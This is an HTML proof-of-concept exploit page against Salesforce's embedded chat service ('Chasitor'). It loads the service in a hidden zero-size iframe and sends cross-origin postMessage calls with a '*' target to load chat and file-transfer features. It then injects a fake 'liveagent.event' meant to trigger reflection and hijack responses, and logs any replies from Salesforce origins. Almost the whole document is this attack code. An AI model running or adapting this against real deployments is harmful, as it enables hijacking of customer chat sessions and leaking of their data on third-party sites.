<!DOCTYPE html>
<html>
<head>
  <title>Salesforce Chasitor Exploit PoC</title>
  <meta charset="UTF-8">
  <style>
    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
    pre { white-space: pre-wrap; }
  </style>
</head>
<body>
  <h2>[+] Salesforce Chasitor Reflection PoC</h2>
  <pre id="log">Initializing...</pre>

  <iframe id="eswFrame"
    src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://your-site.example"
    style="width:0; height:0; border:0;" 
    onload="onIframeLoad()"
    allow="camera *; microphone *;">
  </iframe>

  <script>
    const log = (...args) => {
      const l = document.getElementById('log');
      l.textContent += "\n" + args.map(a => typeof a === 'object' ? JSON.stringify(a, null, 2) : a).join(' ');
    };

    let iframe = document.getElementById("eswFrame");

    window.addEventListener("message", (e) => {
      if (e.origin.includes("force.com") || e.origin.includes("salesforce.com")) {
        log("ðŸ“© Message from iframe:", e.data);
      }
    });

    function sendPayload() {
      log("ðŸ“¤ Sending script.load for feature: 'chasitor'");
      iframe.contentWindow.postMessage({
        method: "script.load",
        feature: "chasitor"
      }, "*");

      log("ðŸ“¤ Sending script.load for feature: 'filetransfer'");
      iframe.contentWindow.postMessage({
        method: "script.load",
        feature: "filetransfer"
      }, "*");

      setTimeout(() => {
        log("ðŸ“¤ Sending fake liveagent.event to trigger reflection");

        iframe.contentWindow.postMessage({
          method: "liveagent.event",
          data: {
            event: "chasitorDataDump",
            params: {
              key: "POC",
              value: "Response hijack attempt"
            }
          }
        }, "*");
      }, 2000);
    }

    function onIframeLoad() {
      log("[+] Iframe loaded (Salesforce 4.0)");
      setTimeout(sendPayload, 1000);
    }
  </script>
</body>
</html>
